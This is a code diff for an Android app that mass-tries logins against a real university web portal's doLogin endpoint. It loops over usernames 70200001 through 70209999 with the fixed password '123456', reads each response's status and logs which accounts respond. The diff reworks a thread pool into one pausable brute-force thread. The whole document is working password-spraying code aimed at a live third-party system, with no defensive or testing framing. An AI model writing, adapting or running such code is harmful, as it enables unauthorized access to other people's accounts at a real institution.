@@ -11,6 +11,7 @@ import android.widget.ScrollView;
 import android.widget.TextView;
 import android.widget.Toast;
 import android.widget.ToggleButton;
+import org.apache.http.client.HttpClient;
 import org.apache.http.client.methods.HttpPost;
 import org.apache.http.HttpResponse;
 import org.apache.http.NameValuePair;
@@ -19,6 +20,7 @@ import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.message.BasicNameValuePair;
 import org.apache.http.protocol.HTTP;
 import org.apache.http.util.EntityUtils;
+import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.util.ArrayList;
@@ -35,25 +37,25 @@ public class MainActivity extends Activity {
 
     private Handler handler;
     private ExecutorService pool;
+    public boolean suspend = false;
+    private Thread netThread = null;
 
     private View.OnClickListener onStartButtonClick = new View.OnClickListener() {
         @Override
         public void onClick(View v) {
             Log.i("StartButton", "Click.");
-
             ToggleButton button = (ToggleButton) v;
 
             if (button.isChecked()){
-                logArea.setText("");
-                if (pool.isShutdown()){
-                    pool = Executors.newSingleThreadExecutor();
+//                logArea.setText("");
+                if (null == netThread){
+                    netThread = new AttemptThread();
+                    netThread.start();
                 }
-                for (int i=1; i<10000;i++){
-                    pool.execute(new AttemptThread(handler, String.valueOf(70200000+i), "123456"));
-                }
+                suspend = false;
             }
             else{
-                pool.shutdownNow();
+                suspend = true;
             }
         }
     };
@@ -78,44 +80,61 @@ public class MainActivity extends Activity {
     }
 
     private class AttemptThread extends Thread{
-        private Handler handler;
-        private String user;
-        private String password;
+        private HttpPost httpPost = new HttpPost("http://w.nuaa.edu.cn/iPortal/action/doLogin.do");
+        private HttpClient httpClient = new DefaultHttpClient();
+        private HttpResponse httpResponse = null;
 
-        AttemptThread(Handler handler, String user, String password){
-            this.handler = handler;
-            this.user = user;
-            this.password = password;
-        }
+        private List<NameValuePair> params=new ArrayList<>();
+        private BasicNameValuePair valueSaved = new BasicNameValuePair("saved", "0");
+        private BasicNameValuePair valueDomain = new BasicNameValuePair("domain", "1");
+        private BasicNameValuePair valueFrom = new BasicNameValuePair("from", "003cc944be32e25365428f2dd2adbbe2");
+        private BasicNameValuePair valuePassword = new BasicNameValuePair("password", "123456");
+
+        private String stringResponse = null;
 
         @Override
         public void run(){
-            HttpPost httpPost = new HttpPost("http://w.nuaa.edu.cn/iPortal/action/doLogin.do");
+            for (int user=70200001; user<=70209999; user++) {
+                params.clear();
+                params.add(valueSaved);
+                params.add(valueDomain);
+                params.add(valueFrom);
+                params.add(valuePassword);
+                params.add(new BasicNameValuePair("username", String.valueOf(user)));
 
-            List<NameValuePair> params=new ArrayList<>();
-            params.add(new BasicNameValuePair("saved", "0"));
-            params.add(new BasicNameValuePair("from", "003cc944be32e25365428f2dd2adbbe2"));
-            params.add(new BasicNameValuePair("domain", "1"));
-            params.add(new BasicNameValuePair("username", user));
-            params.add(new BasicNameValuePair("password", password));
+                try {
+                    httpPost.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
+                    httpResponse = httpClient.execute(httpPost);
 
-            try {
-                httpPost.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
-                HttpResponse response = new DefaultHttpClient().execute(httpPost);
+                    if (httpResponse.getStatusLine().getStatusCode() == 200) {
+                        stringResponse = EntityUtils.toString(httpResponse.getEntity());
+                        JSONObject json = new JSONObject(stringResponse);
+                        String status = (String) new JSONObject((String) json.get("data")).get("status");
 
-                Log.i("AttemptThread", "Run " + user + " " + password + " " + response.getStatusLine().getStatusCode());
-
-                if (response.getStatusLine().getStatusCode() == 200){
-                    JSONObject json = new JSONObject(EntityUtils.toString(response.getEntity()));
-                    String status = (String)new JSONObject((String)json.get("data")).get("status");
-
-                    Message message = handler.obtainMessage(0x56, status);
-                    message.arg1 = Integer.parseInt(user);
-                    message.sendToTarget();
+                        Message message = handler.obtainMessage(0x56, status);
+                        message.arg1 = user;
+                        message.sendToTarget();
+                    }
+                    else {
+                        Log.e("Error", "Http response is " + String.valueOf(httpResponse.getStatusLine().getStatusCode()));
+                    }
                 }
-            }
-            catch (Exception e){
-                Log.e("Error", e.getClass().toString());
+                catch (JSONException e){
+                    Log.e("JsonException", stringResponse);
+                }
+                catch (Exception e) {
+                    Log.e("Error", e.getClass().toString());
+                }
+
+                while (suspend){
+                    try {
+                        Thread.sleep(1000);
+                        Log.i("HeartBeat", String.valueOf(System.currentTimeMillis()));
+                    }
+                    catch (InterruptedException e){
+                        Log.e("Error", e.getClass().toString());
+                    }
+                };
             }
         }
     }
@@ -129,13 +148,14 @@ public class MainActivity extends Activity {
                 case 0x56:{
                     Log.i("MessageHandle", String.valueOf(message.arg1) + " " + message.obj);
 
-                    if (0 == message.arg1 % 10){
-                        logArea.append(buffer);
-                        buffer = "";
-                    }
-                    else {
-                        buffer += String.valueOf(message.arg1) + " " + message.obj + "\n";
-                    }
+                    logArea.append(String.valueOf(message.arg1) + " " + message.obj + "\n");
+//                    if (0 == message.arg1 % 10){
+//                        logArea.append(buffer);
+//                        buffer = "";
+//                    }
+//                    else {
+//                        buffer += String.valueOf(message.arg1) + " " + message.obj + "\n";
+//                    }
 
 //                    ScrollView::fullScroll(View.FOCUS_DOWN);
 
